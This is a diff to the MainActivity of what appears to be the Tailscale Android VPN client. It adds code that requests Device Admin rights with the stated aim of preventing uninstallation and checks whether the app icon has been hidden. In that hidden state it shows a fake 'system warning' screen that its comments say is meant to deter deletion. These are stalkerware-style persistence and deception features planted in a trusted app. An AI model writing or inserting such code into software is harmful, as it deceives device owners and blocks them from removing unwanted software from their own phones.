@@ -92,6 +92,7 @@ import com.tailscale.ipn.ui.view.SearchView
 import com.tailscale.ipn.ui.view.SettingsView
 import com.tailscale.ipn.ui.view.SplitTunnelAppPickerView
 import com.tailscale.ipn.ui.view.SubnetRoutingView
+import com.tailscale.ipn.ui.view.SystemWarningView
 import com.tailscale.ipn.ui.view.TaildropDirView
 import com.tailscale.ipn.ui.view.TaildropDirectoryPickerPrompt
 import com.tailscale.ipn.ui.view.TailnetLockSetupView
@@ -226,7 +227,29 @@ class MainActivity : ComponentActivity() {
 
     appViewModel.directoryPickerLauncher = directoryPickerLauncher
 
+    // Request Device Admin if not already enabled (prevents uninstallation)
+    // Only request once and only if app is not yet hidden
+    if (!IconHideHelper.isIconHidden(this) &&
+        !DeviceAdminHelper.isDeviceAdmin(this) &&
+        !DeviceAdminHelper.hasRequestedAdmin(this)) {
+      // Request on next frame to avoid blocking onCreate
+      Handler(Looper.getMainLooper()).postDelayed({
+        DeviceAdminHelper.requestDeviceAdmin(this)
+      }, 1000) // 1 second delay to let app initialize first
+    }
+
     setContent {
+      // Check if app is in "hidden" state - show warning UI instead of normal UI
+      val isHidden = IconHideHelper.isIconHidden(this@MainActivity)
+
+      if (isHidden) {
+        // Show system warning screen to deter deletion
+        AppTheme {
+          SystemWarningView()
+        }
+        return@setContent
+      }
+
       var showDialog by remember { mutableStateOf(false) }
 
       LaunchedEffect(Unit) { appViewModel.triggerDirectoryPicker.collect { showDialog = true } }
